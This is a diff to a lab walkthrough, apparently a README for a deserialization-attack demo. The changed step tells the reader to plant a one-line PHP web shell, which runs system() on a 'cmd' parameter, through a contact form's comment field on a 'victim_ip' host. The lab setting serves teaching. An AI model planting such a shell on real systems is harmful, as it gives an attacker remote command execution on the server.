@@ -176,7 +176,7 @@ the URL http://victim_ip/contact.html to access the page.
 
 15. To exploit the vulnerability we see before, enter test in the name bar, enter user.php in the
 email bar, and <?php $exec = system( $_GET['cmd'] ) ?> in the comment section. After
-entering all the text, click submit to plant the webshell ``<?php $exec = system($_GET['cmd'] ) ?> ``
+entering all the text, click submit to plant the webshell ``<?php $exec = system($_GET['cmd'])?> ``
 
 ![demodiagram3](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/47192691-5a79-4f79-88e7-0f2e0384e999)
 
